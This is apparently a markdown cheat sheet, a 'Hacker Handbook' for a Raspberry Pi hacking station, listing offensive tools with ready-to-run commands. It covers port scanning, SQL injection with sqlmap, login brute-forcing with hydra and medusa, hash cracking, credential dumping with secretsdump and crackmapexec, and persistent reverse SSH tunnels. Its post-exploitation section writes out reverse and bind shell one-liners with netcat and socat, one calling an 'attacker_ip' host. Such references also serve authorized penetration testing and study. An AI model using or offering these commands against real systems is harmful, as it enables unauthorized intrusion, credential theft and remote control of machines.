# Hacker Handbook – DietPi Remote Hacking Station

Quick-reference guide for all installed tools. Each tool includes a short description, basic syntax, and practical examples. No fluff — just actionable commands.

---

## Essentials

### openssh-server
SSH server to remotely access the Pi.
- Start service: `sudo systemctl start ssh`
- Enable on boot: `sudo systemctl enable ssh`

### tmux / screen
Persistent terminal multiplexer.
- Start: `tmux` or `screen`
- Detach: `Ctrl+b d` (tmux), `Ctrl+a d` (screen)
- Reattach: `tmux attach` or `screen -r`

### htop
Interactive process viewer.
- Run: `htop`

### curl / wget
Download or interact with web services.
- `curl http://example.com`
- `wget http://example.com/file.txt`
- `curl -X POST -d "username=admin" http://target.com/login`

### git
Clone and manage Git repositories.
- `git clone https://github.com/user/repo.git`
- `git pull`

### unzip / p7zip-full
Extract archives.
- `unzip file.zip`
- `7z x file.7z`

### python3 / pip3
Run Python scripts or install modules.
- `python3 script.py`
- `pip3 install requests`

---

## Recon & OSINT

### nmap
Port scanner and service detection.
- `nmap -sV -p- target.com`
- `nmap -O target.com` (OS detection)

### masscan
Ultra-fast port scanner.
- `masscan -p1-65535 target.com --rate=1000`

### whois
Domain ownership info.
- `whois target.com`

### dnsutils (dig, nslookup)
DNS lookups.
- `dig target.com`
- `nslookup target.com`

### amass
Subdomain enumeration.
- `amass enum -d example.com`

### theHarvester
Email/subdomain intel gathering.
- `theHarvester -d example.com -b google`

### sublist3r
Subdomain scanner.
- `python3 sublist3r.py -d example.com`

---

## Web Hacking

### ffuf
Directory and fuzzing tool.
- `ffuf -u http://site/FUZZ -w wordlist.txt`
- `ffuf -u http://site/page.php?id=FUZZ -w ids.txt`

### dirsearch
Brute-force web paths.
- `python3 dirsearch.py -u http://target.com -e php,html`

### nikto
Vulnerability scanner for webservers.
- `nikto -h http://target.com`

### sqlmap
SQL injection automation.
- `sqlmap -u "http://site?id=1" --dbs`
- `sqlmap -r request.txt --batch`

### wpscan
Scan WordPress for vulnerabilities.
- `wpscan --url http://target.com`
- `wpscan --url http://target.com --enumerate u`

### whatweb
Detect technologies used on websites.
- `whatweb http://target.com`

---

## Password Cracking & Bruteforce

### hydra
Login bruteforcer.
- `hydra -l admin -P rockyou.txt target.com http-get`
- `hydra -V -f -l root -P ssh.txt ssh://192.168.1.100`

### medusa
Alternative fast bruteforcer.
- `medusa -h target.com -U users.txt -P passwords.txt -M ssh`

### john
Offline hash cracker.
- `john hashes.txt`
- `john --show hashes.txt`

### hashcat
GPU-based cracker (limited on Pi).
- `hashcat -m 0 -a 0 hashes.txt wordlist.txt`

---

## Network Analysis & Post-Exploitation

### tcpdump
Packet capture.
- `tcpdump -i eth0 -w capture.pcap`
- `tcpdump -nn -i wlan0 port 80`

### tshark
Terminal Wireshark.
- `tshark -i eth0 -Y http`

### bettercap
MITM & network toolkit.
- `bettercap -iface eth0`
- `net.probe on; net.show`

### netcat-traditional
Shells and listeners.
- Listener: `nc -lvnp 4444`
- Reverse shell: `nc target.com 4444 -e /bin/bash`

### socat
Advanced listener and bind shells.
- Bind shell: `socat TCP-LISTEN:4444,fork EXEC:/bin/bash`
- Reverse shell: `socat TCP:attacker_ip:4444 EXEC:/bin/bash`

---

## Utilities & Scripting

### jq
Parse and format JSON.
- `cat data.json | jq '.'`

### xxd
Hex dump.
- `xxd file`
- `xxd -r file.hex > file.bin`

### base64
Encode and decode data.
- `echo "text" | base64`
- `echo "dGV4dA==" | base64 -d`

### tr / sed / awk
Text transformations.
- `echo "ABC" | tr 'A-Z' 'a-z'`
- `echo "123 abc" | sed 's/abc/xyz/'`
- `awk '{print $1}' file.txt`

---

## Advanced Tools

### pipx
Install and run Python tools in isolation.
- `pipx install crackmapexec`

### crackmapexec
SMB/AD post-exploitation.
- `cme smb 192.168.1.0/24 -u user -p pass`
- `cme smb target --shares`

### impacket
Protocol tools and exploit scripts.
- `GetUserSPNs.py domain/user:pass`
- `secretsdump.py -target-ip 192.168.1.1 user@domain`

### httpx
HTTP probing.
- `httpx -l urls.txt -status -title`
- `echo http://target.com | httpx -tech-detect`

---

## Optional Tools

### autossh
Persistent reverse SSH tunnel.
- `autossh -M 0 -f -N -R 2222:localhost:22 user@remote-host`

### sshuttle
VPN over SSH (rootless VPN-style access).
- `sshuttle -r user@host 0.0.0.0/0`

### ngrok
Expose local service through public tunnel.
- `./ngrok config add-authtoken <token>`
- `./ngrok tcp 22`

### SecLists
Wordlists located at `/opt/SecLists`
- Use with ffuf, hydra, wfuzz, etc.

### PayloadsAllTheThings
Payloads and exploitation techniques.
- Browse: `/opt/PayloadsAllTheThings`
- Useful for bypassing filters, LFI/RFI, SSTI, etc.
